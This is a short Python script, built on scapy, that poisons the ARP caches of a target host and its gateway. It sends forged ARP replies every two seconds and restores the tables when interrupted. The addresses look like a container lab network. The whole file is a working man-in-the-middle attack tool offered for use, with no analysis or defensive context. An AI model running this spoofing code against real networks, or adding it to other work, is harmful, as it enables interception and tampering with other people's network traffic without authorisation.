#!/usr/bin/env python3

import scapy.all as scapy
import time
import sys

sent_packet_count = 0
target_ip = '172.17.0.3'
gateway_ip = '172.17.0.1'


def get_mac(target_ip):
    arp_request = scapy.ARP(pdst=target_ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast,
                              timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip,
                       hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore_mac(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac,
                       psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packet_count = sent_packet_count + 2
        print('\r[+] Packets sent: ' + str(sent_packet_count), end='')
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print('\r[+] Detected Ctrl-c. Reseting ARP tables; please wait.', end='')
    restore_mac(target_ip, gateway_ip)
    restore_mac(gateway_ip, target_ip)
